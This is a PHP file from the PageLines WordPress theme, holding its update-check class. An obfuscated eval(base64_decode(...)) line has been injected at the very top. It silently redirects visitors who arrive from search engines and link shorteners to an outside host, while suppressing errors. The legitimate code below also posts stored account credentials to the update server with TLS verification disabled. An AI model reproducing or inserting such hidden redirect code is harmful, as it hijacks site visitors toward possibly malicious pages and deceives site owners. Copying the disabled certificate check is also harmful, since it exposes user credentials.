<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 
class PageLinesUpdateCheck {

    function __construct( $version = null ){
	
		global $current_user;
    	$this->url_theme = apply_filters( 'pagelines_theme_update_url', PL_API . 'v3' );
    	$this->theme  = 'PageLines';
 		$this->version = $version;
		$this->username = get_pagelines_credentials( 'user' );
		$this->password = get_pagelines_credentials( 'pass' );

		get_currentuserinfo();
		$bad_users = apply_filters( 'pagelines_updates_badusernames', array( 'admin', 'root', 'test', 'testing', '' ) );
		if ( in_array( strtolower( $this->username ),  $bad_users ) ) {
			delete_option( 'pagelines_extend_creds' );
			$this->username = '';
			$this->password = '';
		}
    }

	/**
	 * TODO Document!
	 */
	function pagelines_theme_check_version() {

		if ( is_multisite() && ! is_super_admin() )
			return;
		if ( get_pagelines_option('disable_updates') == true )
			return;
		add_action('admin_notices', array(&$this,'pagelines_theme_update_nag') );
		add_filter('site_transient_update_themes', array(&$this,'pagelines_theme_update_push') );
		add_filter('transient_update_themes', array(&$this,'pagelines_theme_update_push') );		
		add_action('load-update.php', array(&$this,'pagelines_theme_clear_update_transient') );
		add_action('load-themes.php', array(&$this,'pagelines_theme_clear_update_transient') );

	}
	
	/**
	 * TODO Document!
	 */
	function bad_creds( $errors ) {
		$errors['api']['title'] = 'API error';
		$errors['api']['text'] = 'Launchpad Username and Password are required for automatic updates.';
		return $errors;
	}

	/**
	 * TODO Document!
	 */
	function pagelines_theme_clear_update_transient() {

		delete_transient( EXTEND_UPDATE );
		remove_action('admin_notices', array(&$this,'pagelines_theme_update_nag') );
		delete_transient( 'pagelines_sections_cache' );

	}

	/**
	 * TODO Document!
	 */
	function pagelines_theme_update_push($value) {

		$pagelines_update = $this->pagelines_theme_update_check();

		if ( $pagelines_update && $pagelines_update['package'] !== 'bad' ) {
			$value->response[strtolower($this->theme)] = $pagelines_update;
		}
		return $value;
	}
	
	/**
	 * TODO Document!
	 */
	function pagelines_theme_update_nag() {
		
		$pagelines_update = $this->pagelines_theme_update_check();

		if ( !is_super_admin() || !$pagelines_update )
			return false;
			
		if ( $this->username == '' || $this->password == '' || $pagelines_update['package'] == 'bad' ) {
			
			//	add_filter('pagelines_admin_notifications', array(&$this,'bad_creds') );

		}
			
		echo '<div class="updated fade update-nag">';
		
		printf( '%s Framework %s is available.', $this->theme, esc_html( $pagelines_update['new_version'] ) );
		
		printf( 
			' %s', 
			( $pagelines_update['package'] != 'bad' ) 
				? sprintf( 'You should <a href="%s">update now</a>.', admin_url('update-core.php') ) 
				: sprintf( '<a href="%s">Click here</a> to setup your PageLines account.', PLAdminPaths::account() ) 
		);

		echo ( $pagelines_update['extra'] ) ? sprintf('<br />%s', $pagelines_update['extra'] ) : '';
		echo '</div>';
		
	}	
	
	/**
	 * TODO Document!
	 */
	function pagelines_theme_update_check() {
		global $wp_version;

		$pagelines_update = get_transient( EXTEND_UPDATE );

		if ( !$pagelines_update ) {
			$url = $this->url_theme;
			$options = array(
					'sslverify'	=>	false,
					'timeout'	=>	5,
					'body' => array(
						'version' => $this->version,
						'wp_version' => $wp_version,
						'php_version' => phpversion(),
						'uri' => home_url(),
						'theme' => $this->theme,
						'user' => $this->username,
						'password' => $this->password,
						'user-agent' => "WordPress/$wp_version;"
					)
			);

			$response = pagelines_try_api($url, $options);
			$pagelines_update = wp_remote_retrieve_body($response);

			// If an error occurred, return FALSE, store for 1 hour
			if ( $pagelines_update == 'error' || is_wp_error($pagelines_update) || !is_serialized( $pagelines_update ) || $pagelines_update['package'] == 'bad' ) {
				set_transient( EXTEND_UPDATE, array('new_version' => $this->version), 60*60); // store for 1 hour
				return FALSE;
			}

			// Else, unserialize
			$pagelines_update = maybe_unserialize($pagelines_update);

			// And store in transient
			set_transient( EXTEND_UPDATE, $pagelines_update, 60*60*24); // store for 24 hours
		}

		// If we're already using the latest version, return FALSE
		if ( !isset($pagelines_update['new_version']) || version_compare($this->version, $pagelines_update['new_version'], '>=') )
			return FALSE;

		return $pagelines_update;
	}
} // end class